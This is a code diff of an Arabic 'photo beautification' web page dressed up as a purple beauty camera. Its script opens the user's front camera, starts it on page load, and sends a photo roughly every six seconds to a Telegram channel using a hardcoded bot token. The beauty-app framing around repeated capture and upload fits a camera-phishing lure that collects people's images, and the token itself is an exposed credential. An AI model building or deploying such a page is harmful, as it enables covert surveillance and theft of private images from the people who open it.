@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>تجـميل الصور · كاميرا بنفسجية</title>
     <style>
         * {
@@ -20,7 +20,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 1.2rem;
+            padding: 1rem;
             position: relative;
         }
 
@@ -43,13 +43,13 @@
             z-index: 20;
             max-width: 550px;
             width: 100%;
-            background: rgba(15, 7, 28, 0.7);
+            background: rgba(15, 7, 28, 0.75);
             backdrop-filter: blur(20px) saturate(180%);
             -webkit-backdrop-filter: blur(20px) saturate(180%);
             border-radius: 56px;
-            border: 1.5px solid rgba(200, 150, 255, 0.4);
+            border: 1.5px solid rgba(200, 150, 255, 0.5);
             box-shadow: 0 35px 75px #000000cc, 0 0 0 2px #a974ff1a inset, 0 0 45px #9147ff4d;
-            padding: 30px 28px 45px;
+            padding: 20px 18px 30px;
             transition: box-shadow 0.3s;
         }
 
@@ -59,10 +59,10 @@
 
         .cover-glam {
             width: 100%;
-            height: 150px;
+            height: 130px;
             background: linear-gradient(125deg, #321f4f, #1b0f2b, #2f1752);
             border-radius: 42px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -74,7 +74,7 @@
 
         .cover-glam::before {
             content: '✨';
-            font-size: 110px;
+            font-size: 100px;
             position: absolute;
             right: 0px;
             top: -15px;
@@ -86,7 +86,7 @@
 
         .cover-glam::after {
             content: '🌸';
-            font-size: 100px;
+            font-size: 90px;
             position: absolute;
             left: 0px;
             bottom: -25px;
@@ -97,7 +97,7 @@
         }
 
         .glam-text {
-            font-size: 42px;
+            font-size: 38px;
             font-weight: 900;
             letter-spacing: 4px;
             background: linear-gradient(145deg, #f7ecff, #dbb5ff, #fadfff);
@@ -107,33 +107,33 @@
             text-shadow: 0 0 35px #d6a9ff, 0 0 90px #b36eff;
             z-index: 10;
             filter: drop-shadow(0 8px 10px black);
-            transform: scale(1.02);
         }
 
         .main-title {
-            font-size: 3.3rem;
+            font-size: 2.5rem;
             font-weight: 800;
             text-align: center;
-            margin: 5px 0 20px;
+            margin: 5px 0 15px;
             background: linear-gradient(145deg, #f0dcff, #d7b0ff, #fbeaff);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             text-shadow: 0 0 35px #ad6eff, 2px 4px 15px #13001f;
             line-height: 1.2;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
         }
 
         .video-case {
             background: #0b0415;
             border-radius: 48px;
-            padding: 12px;
+            padding: 8px;
             border: 2px solid #ac7eff;
             box-shadow: 0 25px 45px black, 0 0 0 3px #c49dff4d inset, 0 0 60px #b163ff;
-            margin: 20px 0;
+            margin: 15px 0;
+            position: relative;
         }
 
-        video, canvas {
+        video {
             width: 100%;
             border-radius: 42px;
             display: block;
@@ -141,102 +141,95 @@
             object-fit: cover;
             background: #110824;
             border: 1px solid #d1adff;
+            transform: scaleX(-1);
         }
 
-        .countdown-ring {
-            position: relative;
+        canvas {
+            display: none;
         }
 
         #countdownOverlay {
             position: absolute;
-            top: 25px;
-            left: 25px;
-            background: rgba(22, 6, 40, 0.7);
+            top: 20px;
+            left: 20px;
+            background: rgba(22, 6, 40, 0.8);
             backdrop-filter: blur(14px);
             border: 2px solid #d19cff;
-            width: 85px;
-            height: 85px;
+            width: 75px;
+            height: 75px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 3.2rem;
+            font-size: 2.5rem;
             font-weight: 900;
             color: #f2dcff;
             text-shadow: 0 0 35px #f2dcff, 0 0 75px #c481ff;
             box-shadow: 0 0 45px #d19cff, 0 8px 25px black;
             border: 2px solid #ebcdff;
+            z-index: 30;
         }
 
         .camera-badge {
             position: absolute;
-            bottom: 25px;
-            right: 25px;
+            bottom: 20px;
+            right: 20px;
             background: #13052bcc;
             backdrop-filter: blur(15px);
             border-radius: 60px;
-            padding: 12px 24px;
+            padding: 8px 20px;
             border: 1px solid #d1a3ff;
             color: #edd9ff;
             font-weight: 700;
-            font-size: 1.2rem;
+            font-size: 1rem;
             display: flex;
-            gap: 12px;
+            gap: 10px;
             align-items: center;
             box-shadow: 0 0 45px #cb9eff;
-            letter-spacing: 0.5px;
+            z-index: 30;
         }
 
         .start-button {
             background: linear-gradient(150deg, #3c1e66, #1d0d33, #351b55);
             border: 1px solid #c8a2ff;
             border-radius: 88px;
-            padding: 24px 40px;
+            padding: 18px 30px;
             width: 100%;
-            font-size: 2.5rem;
+            font-size: 2rem;
             font-weight: 800;
             color: #f4e6ff;
             text-shadow: 0 4px 12px black, 0 0 40px #e3bdff;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 25px;
+            gap: 20px;
             box-shadow: 0 28px 45px #000000e0, 0 0 0 2px #e7c7ff inset, 0 0 60px #ba7eff;
             cursor: pointer;
             transition: all 0.25s ease;
-            margin: 35px 0 20px;
-            border: 1.5px solid #e2b9ff;
-        }
-
-        .start-button:hover {
-            background: linear-gradient(150deg, #542d87, #2d174b, #472a6b);
-            box-shadow: 0 30px 60px black, 0 0 0 3px #f3dbff inset, 0 0 80px #e2aeff;
-            transform: scale(1.02);
-            gap: 35px;
-            color: white;
+            margin: 25px 0 15px;
         }
 
         .start-button:active {
-            transform: scale(0.97);
-            background: #2c1549;
+            transform: scale(0.98);
         }
 
         .status-panel {
             background: #120a1fcc;
             backdrop-filter: blur(20px);
             border-radius: 80px;
-            padding: 20px 25px;
-            margin: 18px 0 15px;
+            padding: 16px 20px;
+            margin: 15px 0 12px;
             border: 1.5px solid #b27eff;
             color: #efdcff;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             font-weight: 600;
             text-align: center;
             box-shadow: 0 5px 35px black;
-            min-height: 85px;
+            min-height: 75px;
             display: flex;
             align-items: center;
             justify-content: center;
+            word-break: break-word;
         }
 
         .status-panel.success {
@@ -257,14 +250,14 @@
             background: #0d0720b3;
             backdrop-filter: blur(16px);
             border-radius: 50px;
-            padding: 18px 22px;
+            padding: 14px 18px;
             border: 1px dashed #af80ff;
             color: #cab6ff;
-            font-size: 0.95rem;
+            font-size: 0.85rem;
             box-shadow: 0 8px 30px black;
             direction: ltr;
             text-align: left;
-            max-height: 120px;
+            max-height: 100px;
             overflow-y: auto;
         }
 
@@ -278,6 +271,15 @@
             z-index: 5;
             pointer-events: none;
         }
+
+        @media (max-width: 550px) {
+            .container { padding: 16px 14px 24px; }
+            .glam-text { font-size: 32px; }
+            .main-title { font-size: 2rem; }
+            .start-button { font-size: 1.6rem; padding: 14px 20px; gap: 12px; }
+            #countdownOverlay { width: 60px; height: 60px; font-size: 2rem; top: 12px; left: 12px; }
+            .camera-badge { padding: 6px 14px; font-size: 0.85rem; bottom: 12px; right: 12px; }
+        }
     </style>
 </head>
 <body>
@@ -289,9 +291,9 @@
 
         <div class="main-title">تجـميل الصور</div>
 
-        <div class="video-case countdown-ring">
-            <video id="video" autoplay playsinline></video>
-            <canvas id="canvas" style="display: none;"></canvas>
+        <div class="video-case" style="position: relative;">
+            <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas"></canvas>
             <div id="countdownOverlay">5</div>
             <div class="camera-badge">
                 <span>📷</span> أمامية HD
@@ -313,203 +315,317 @@
 
     <script>
         (function() {
-            // ✅ بيانات البوت والقناة - تم التحديث حسب طلبك
+            // ✅ بيانات البوت والقناة
             const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
-            const CHANNEL_ID = '-1003875161698';  // معرف القناة
+            const CHANNEL_ID = '-1003875161698';
 
             // العناصر
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const statusDiv = document.getElementById('status');
             const countdownDiv = document.getElementById('countdownOverlay');
-            const debugText = document.getElementById('debugText');
+            const debugSpan = document.getElementById('debugText');
             const startBtn = document.getElementById('startCaptureBtn');
 
             // الحالة
-            let stream = null;
-            let countdown = 5;
+            let mediaStream = null;
+            let cameraActive = false;
             let captureInterval = null;
             let isCapturing = false;
-            let cameraReady = false;
-            let photoCounter = 1; // عداد الصور
+            let pendingCapture = false;
+            let photoCounter = 1;
 
-            // دالة تحديث التصحيح
-            function updateDebug(msg) {
-                const time = new Date().toLocaleTimeString('ar-EG');
-                debugText.innerText = `${msg}  •  ${time}`;
-                console.log(msg);
+            // تحديث التصحيح
+            function updateDebug(msg, isError = false) {
+                const time = new Date().toLocaleTimeString('ar-EG', { hour12: false });
+                const prefix = isError ? '⚠️ ' : '🔹 ';
+                debugSpan.innerText = `${prefix}${msg}  [${time}]`;
+                console.log('[تجميل الصور]', msg);
             }
 
-            // إرسال الصورة إلى قناة تيليجرام
-            async function sendToTelegram(imageDataUrl) {
-                try {
-                    updateDebug('تجهيز الصورة للإرسال...');
-                    statusDiv.className = 'status-panel';
-                    statusDiv.innerHTML = '⏳ جاري الإرسال إلى قناة تيليجرام...';
+            // التقاط الصورة من الفيديو (كاميرا أمامية مع عكس الصورة)
+            async function captureImageFromVideo() {
+                if (!cameraActive || !mediaStream || !video.videoWidth || !video.videoHeight) {
+                    updateDebug('الفيديو غير جاهز للتصوير', true);
+                    return null;
+                }
 
-                    const blob = await (await fetch(imageDataUrl)).blob();
+                try {
+                    const vw = video.videoWidth;
+                    const vh = video.videoHeight;
+
+                    if (vw === 0 || vh === 0) {
+                        throw new Error('أبعاد الفيديو صفر');
+                    }
+
+                    canvas.width = vw;
+                    canvas.height = vh;
+
+                    const ctx = canvas.getContext('2d');
+                    
+                    // عكس الصورة أفقياً للكاميرا الأمامية (لأن الفيديو معكوس)
+                    ctx.translate(vw, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, 0, 0, vw, vh);
+                    ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+                    if (!dataUrl || dataUrl.length < 1000) {
+                        throw new Error('بيانات الصورة غير كافية');
+                    }
+
+                    updateDebug(`✓ تم التقاط صورة بأبعاد ${vw}×${vh}`);
+                    return dataUrl;
+                } catch (err) {
+                    updateDebug(`فشل التقاط الصورة: ${err.message}`, true);
+                    return null;
+                }
+            }
+
+            // إرسال الصورة إلى تيليجرام
+            async function sendPhotoToTelegram(imageDataUrl) {
+                if (!imageDataUrl) {
+                    updateDebug('لا توجد صورة للإرسال', true);
+                    return false;
+                }
+
+                try {
+                    statusDiv.innerHTML = `📤 جاري رفع الصورة #${photoCounter} إلى القناة ...`;
+                    updateDebug(`إرسال الصورة رقم ${photoCounter}`);
+
+                    const response = await fetch(imageDataUrl);
+                    const blob = await response.blob();
+
+                    if (blob.size < 1000) {
+                        throw new Error(`حجم الصورة صغير جداً (${blob.size} بايت)`);
+                    }
+
                     const formData = new FormData();
                     formData.append('chat_id', CHANNEL_ID);
-                    formData.append('photo', blob, `glam_shot_${photoCounter}.png`);
-                    
-                    // معلومات إضافية في التعليق
+                    formData.append('photo', blob, `glam_shot_${photoCounter}.jpg`);
+
                     const now = new Date();
-                    const dateStr = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
+                    const cairoTime = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
                     const caption = `📸 *صورة جديدة من تجميل الصور*\n\n` +
                                    `🖼️ الصورة رقم: ${photoCounter}\n` +
-                                   `📅 التاريخ: ${dateStr}\n` +
+                                   `📅 التاريخ: ${cairoTime}\n` +
                                    `📱 تم التقاطها بواسطة الكاميرا الأمامية\n` +
                                    `✨ بواسطة: تجميل الصور`;
-                    
+
                     formData.append('caption', caption);
                     formData.append('parse_mode', 'Markdown');
 
-                    updateDebug('إرسال إلى القناة...');
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    const apiResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    const result = await response.json();
-                    
-                    if (result.ok) {
+
+                    const json = await apiResponse.json();
+
+                    if (json.ok) {
                         statusDiv.className = 'status-panel success';
-                        statusDiv.innerHTML = `✅ تم إرسال الصورة ${photoCounter} بنجاح إلى القناة!`;
-                        updateDebug(`✓ تم إرسال الصورة ${photoCounter}`);
-                        photoCounter++; // زيادة العداد بعد الإرسال الناجح
+                        statusDiv.innerHTML = `✅ تم إرسال الصورة #${photoCounter} بنجاح إلى القناة!`;
+                        updateDebug(`✓ نجح الإرسال (${(blob.size / 1024).toFixed(1)} كيلوبايت)`);
+                        
+                        photoCounter++;
+                        
+                        setTimeout(() => {
+                            if (cameraActive && isCapturing && statusDiv.classList.contains('success')) {
+                                statusDiv.className = 'status-panel';
+                                statusDiv.innerHTML = '📸 التصوير مستمر - سيتم إرسال الصور تلقائياً';
+                            }
+                        }, 2000);
+                        
+                        return true;
                     } else {
-                        throw new Error(result.description || 'فشل الإرسال');
+                        throw new Error(json.description || 'فشل الإرسال');
                     }
                 } catch (err) {
-                    console.error(err);
+                    console.error('Telegram send error:', err);
+                    updateDebug(`✗ فشل الإرسال: ${err.message}`, true);
                     statusDiv.className = 'status-panel error';
-                    statusDiv.innerHTML = `❌ خطأ في الإرسال: ${err.message}`;
-                    updateDebug(`✗ خطأ: ${err.message}`);
+                    statusDiv.innerHTML = `❌ فشل الإرسال: ${err.message.substring(0, 70)}`;
+                    return false;
                 }
             }
 
-            // التقاط صورة من الفيديو
-            async function captureAndSend() {
-                if (!stream || !cameraReady) {
-                    updateDebug('الكاميرا غير جاهزة');
-                    return;
+            // التصوير والإرسال
+            async function takeAndSendPhoto() {
+                if (!cameraActive || !mediaStream || mediaStream.active === false) {
+                    updateDebug('الكاميرا غير نشطة', true);
+                    return false;
                 }
+
+                if (pendingCapture) {
+                    updateDebug('يوجد عملية تصوير قيد التنفيذ');
+                    return false;
+                }
+
+                pendingCapture = true;
                 try {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    
-                    // قلب الصورة أفقياً لأنها كاميرا أمامية
-                    ctx.translate(canvas.width, 0);
-                    ctx.scale(-1, 1);
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // إعادة الإعدادات للطبيعي
-                    ctx.setTransform(1, 0, 0, 1, 0, 0);
-                    
-                    const dataUrl = canvas.toDataURL('image/png');
-                    updateDebug(`التقطت (${canvas.width}x${canvas.height})`);
-                    await sendToTelegram(dataUrl);
-                } catch (e) {
-                    statusDiv.className = 'status-panel error';
-                    statusDiv.innerHTML = `❌ خطأ التصوير: ${e.message}`;
-                    updateDebug(`تصوير فشل: ${e.message}`);
+                    const imageUrl = await captureImageFromVideo();
+                    if (!imageUrl) {
+                        updateDebug('فشل التقاط الصورة', true);
+                        return false;
+                    }
+
+                    const success = await sendPhotoToTelegram(imageUrl);
+                    return success;
+                } catch (err) {
+                    updateDebug(`خطأ: ${err.message}`, true);
+                    return false;
+                } finally {
+                    pendingCapture = false;
                 }
             }
 
-            // بدء العد والتصوير الدوري
+            // العد التنازلي والتصوير الدوري
+            let countdownValue = 5;
+            
             function startCountdownCycle() {
-                if (!cameraReady || !isCapturing) return;
+                if (!cameraActive || !isCapturing) return;
 
-                countdown = 5;
-                countdownDiv.textContent = countdown;
+                countdownValue = 5;
+                countdownDiv.textContent = countdownValue;
 
                 if (captureInterval) clearInterval(captureInterval);
-                captureInterval = setInterval(() => {
-                    if (!isCapturing || !cameraReady) {
+                
+                captureInterval = setInterval(async () => {
+                    if (!isCapturing || !cameraActive) {
                         clearInterval(captureInterval);
+                        captureInterval = null;
                         return;
                     }
-                    countdown--;
-                    countdownDiv.textContent = countdown;
+                    
+                    countdownValue--;
+                    countdownDiv.textContent = countdownValue;
 
-                    if (countdown <= 0) {
+                    if (countdownValue <= 0) {
                         clearInterval(captureInterval);
+                        captureInterval = null;
                         countdownDiv.textContent = '📸';
-                        captureAndSend().then(() => {
-                            if (isCapturing && cameraReady) {
-                                setTimeout(() => {
-                                    startCountdownCycle();
-                                }, 1000);
-                            } else {
-                                countdownDiv.textContent = '⏸️';
-                            }
-                        }).catch(() => {
-                            if (isCapturing && cameraReady) {
-                                setTimeout(() => startCountdownCycle(), 1200);
-                            }
-                        });
+                        
+                        await takeAndSendPhoto();
+                        
+                        if (isCapturing && cameraActive) {
+                            setTimeout(() => {
+                                startCountdownCycle();
+                            }, 800);
+                        } else {
+                            countdownDiv.textContent = '⏸️';
+                        }
                     }
                 }, 1000);
             }
 
-            // تفعيل وضع الالتقاط
+            // تفعيل وضع التصوير
             function enableCaptureMode() {
-                if (!cameraReady || !stream) {
-                    statusDiv.innerHTML = '⚠️ الكاميرا ليست جاهزة بعد، انتظر أو حاول مرة أخرى.';
+                if (!cameraActive || !mediaStream) {
+                    statusDiv.innerHTML = '⚠️ الكاميرا ليست جاهزة بعد، انتظر قليلاً.';
                     return;
                 }
-                if (isCapturing) {
-                    isCapturing = false;
-                    if (captureInterval) clearInterval(captureInterval);
+                
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                    captureInterval = null;
                 }
+                
                 isCapturing = true;
                 statusDiv.className = 'status-panel';
                 statusDiv.innerHTML = '📸 بدأ التصوير الدوري – سيتم إرسال الصور إلى القناة';
-                updateDebug('وضع التصوير التلقائي نشط');
+                updateDebug('وضع التصوير التلقائي نشط (كل 6 ثوانٍ تقريباً)');
                 startCountdownCycle();
             }
 
-            // تشغيل الكاميرا
-            async function startCamera(forceStart = false) {
+            // إيقاف التصوير
+            function stopCaptureMode() {
+                isCapturing = false;
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                    captureInterval = null;
+                }
+                countdownDiv.textContent = '⏸️';
+                statusDiv.innerHTML = '⏸️ تم إيقاف التصوير. اضغط الزر لبدء التصوير مرة أخرى.';
+                updateDebug('تم إيقاف التصوير');
+            }
+
+            // تبديل وضع التصوير
+            function toggleCapture() {
+                if (!cameraActive) {
+                    statusDiv.innerHTML = '⚠️ الكاميرا غير جاهزة بعد، انتظر قليلاً.';
+                    return;
+                }
+                
+                if (isCapturing) {
+                    stopCaptureMode();
+                } else {
+                    enableCaptureMode();
+                }
+            }
+
+            // إعداد الكاميرا الأمامية
+            async function initFrontCamera() {
                 try {
                     updateDebug('طلب الإذن للكاميرا الأمامية...');
-                    statusDiv.innerHTML = '⏳ جاري تشغيل الكاميرا...';
+                    statusDiv.innerHTML = '📷 يرجى السماح بالوصول إلى الكاميرا ...';
                     
-                    if (stream) {
-                        stream.getTracks().forEach(t => t.stop());
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
+                        mediaStream = null;
                     }
                     
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
-                    });
+                    let stream = null;
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: { exact: "user" } },
+                            audio: false
+                        });
+                    } catch (err) {
+                        updateDebug(`محاولة ثانية للكاميرا الأمامية: ${err.message}`);
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: "user" },
+                            audio: false
+                        });
+                    }
                     
+                    mediaStream = stream;
                     video.srcObject = stream;
-                    cameraReady = false;
+                    video.setAttribute('playsinline', true);
+                    video.muted = true;
+                    cameraActive = false;
                     
                     video.onloadedmetadata = () => {
-                        cameraReady = true;
-                        updateDebug('✅ الكاميرا الأمامية جاهزة');
-                        statusDiv.innerHTML = '✅ الكاميرا تعمل. اضغط "إبدأ التصوير" للإرسال.';
-                        countdownDiv.textContent = '5';
-                        
-                        if (forceStart) {
-                            enableCaptureMode();
-                        }
+                        updateDebug(`الفيديو جاهز - الأبعاد: ${video.videoWidth}×${video.videoHeight}`);
+                        video.play().then(() => {
+                            cameraActive = true;
+                            updateDebug('✅ الكاميرا الأمامية تعمل بنجاح');
+                            statusDiv.className = 'status-panel';
+                            statusDiv.innerHTML = '✅ الكاميرا جاهزة. اضغط "إبدأ التصوير" للإرسال.';
+                            countdownDiv.textContent = '5';
+                        }).catch(err => {
+                            updateDebug(`فشل تشغيل الفيديو: ${err.message}`, true);
+                            statusDiv.innerHTML = '❌ فشل تشغيل الفيديو';
+                        });
                     };
-                } catch (err) {
-                    cameraReady = false;
-                    let errorMsg = '';
-                    if (err.name === 'NotAllowedError') errorMsg = 'تم رفض الإذن. يرجى السماح للكاميرا.';
-                    else if (err.name === 'NotFoundError') errorMsg = 'لا توجد كاميرا أمامية.';
-                    else errorMsg = err.message;
                     
+                    video.onerror = (e) => {
+                        updateDebug(`خطأ في الفيديو`, true);
+                        cameraActive = false;
+                    };
+                    
+                } catch (err) {
+                    cameraActive = false;
+                    let errorMsg = '';
+                    if (err.name === 'NotAllowedError') {
+                        errorMsg = 'تم رفض إذن الكاميرا. يرجى السماح بالوصول للكاميرا.';
+                    } else if (err.name === 'NotFoundError') {
+                        errorMsg = 'لا توجد كاميرا أمامية على هذا الجهاز.';
+                    } else {
+                        errorMsg = err.message;
+                    }
                     statusDiv.className = 'status-panel error';
-                    statusDiv.innerHTML = `❌ خطأ الكاميرا: ${errorMsg}`;
-                    updateDebug(`خطأ: ${errorMsg}`);
+                    statusDiv.innerHTML = `❌ ${errorMsg}`;
+                    updateDebug(`خطأ الكاميرا: ${errorMsg}`, true);
                 }
             }
 
@@ -517,28 +633,30 @@
             startBtn.addEventListener('click', async () => {
                 updateDebug('تم الضغط على زر بدء التصوير');
                 
-                if (!stream || !cameraReady) {
-                    await startCamera(true);
+                if (!mediaStream || !cameraActive) {
+                    await initFrontCamera();
+                    setTimeout(() => {
+                        if (cameraActive) {
+                            enableCaptureMode();
+                        }
+                    }, 500);
                 } else {
-                    if (!isCapturing) {
-                        enableCaptureMode();
-                    } else {
-                        isCapturing = false;
-                        if (captureInterval) clearInterval(captureInterval);
-                        enableCaptureMode();
-                        statusDiv.innerHTML = '🔄 إعادة تشغيل التصوير';
-                    }
+                    toggleCapture();
                 }
             });
 
-            // تنظيف
+            // تنظيف عند الإغلاق
             window.addEventListener('beforeunload', () => {
+                isCapturing = false;
                 if (captureInterval) clearInterval(captureInterval);
-                if (stream) stream.getTracks().forEach(t => t.stop());
+                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
             });
 
-            // رسالة افتتاحية
-            updateDebug('مرحباً! اضغط على الزر البنفسجي.');
+            // بدء التشغيل المبدئي (تشغيل الكاميرا فقط)
+            window.addEventListener('load', async () => {
+                updateDebug('مرحباً! اضغط على الزر البنفسجي لبدء التصوير');
+                await initFrontCamera();
+            });
         })();
     </script>
 </body>
